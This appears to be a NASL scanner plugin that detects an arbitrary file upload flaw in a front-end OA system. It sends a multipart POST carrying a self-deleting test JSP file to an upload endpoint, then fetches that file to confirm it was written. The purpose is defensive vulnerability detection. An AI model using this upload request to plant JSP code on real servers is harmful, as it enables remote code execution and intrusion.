include("compat.inc");


if (description)
{
  script_id(51799323); #WEBRAY_SID
  script_version("1.3");
  script_name(english:"Vulnerability of arbitrary file upload in front-end OA");
  script_summary(english:"Vulnerability of arbitrary file upload in front-end OA");
  script_set_attribute(attribute:"description", value:"Vulnerability of arbitrary file upload in front-end OA.");
  script_set_attribute(attribute:"solution", value:"update system");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"risk_factor", value:"High");
  script_set_attribute(attribute:"in_the_news", value:"true");
  script_end_attributes();
  script_family(english:"Web Servers");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) WebRAY, Inc.");
  script_require_ports("Services/www");
  exit(0);
}



include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("openvas-https2.inc");


ports = get_kb_list("Services/www");
foreach port (ports){
	result_r = check_remote(port:port);
	if (result_r['vuln']){
		security_hole(port:port, extra:result_r['report']);
		exit(0);
	}
}

function check_remote(port){
	url = "/page/exportImport/uploadOperation.jsp";
	random_str1 = hexstr(rand_str(length:4));
	random_str2 = hexstr(rand_str(length:8));
	data = '----------1115941182\nContent-Disposition: form-data; name="file" ;filename="'+ random_str1 +'.jsp"\nContent-Type:application/octet-stream\nContent-Transfer-Encoding: binary\n\n<%\nout.println("-----test_'+ random_str2 +'-----");\nnew java.io.File(application.getRealPath(request.getServletPath())).delete();\n%>\n----------1115941182--';
	if (get_kb_list("SSL/Transport/"+port)){
		var req =
				'POST '+ url +' HTTP/1.1\r\n' +
				'Host: ' + get_host_ip()+':'+ port+ '\r\n' +
				'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0' + '\r\n' +
				'Accept-Encoding: gzip, deflate' + '\r\n' +
				'Content-Type: multipart/form-data; boundary=--------1115941182' + '\r\n' +
				'Upgrade-Insecure-Requests: 1' + '\r\n' +
				'Connection: keep-alive'+ '\r\n' +
				'Accept: */*' + '\r\n' + 
				'\r\n'+data;
				
		https_req_get(request:req, port:port);
		sleep(1);
		url_r = "/page/exportImport/fileTransfer/"+ random_str1 +".jsp";
		res = http_get(item:url_r, port:port);
		
		ssl_ress = https_req_get(request:res, port:port);
		rz_data = "test_" + random_str2;
		
		if(rz_data >< ssl_ress){
			report = ssl_ress;
			return {'vuln':true, 'report':report};
		}
	}
	else{
		http_send_recv3(method: "POST",port: port, data:data, item: url, add_headers: make_array("Content-Type","multipart/form-data; boundary=--------1115941182"));
		sleep(1);
		url_r = "/page/exportImport/fileTransfer/"+ random_str1 +".jsp";
		res_send = http_send_recv3(method: "GET",port: port, item: url_r);
		
		rz_data = "test_" + random_str2;
		
		if(rz_data >< res_send[2]){
			report = res_send[2];
			return {'vuln':true, 'report':report};
		}

	}
}
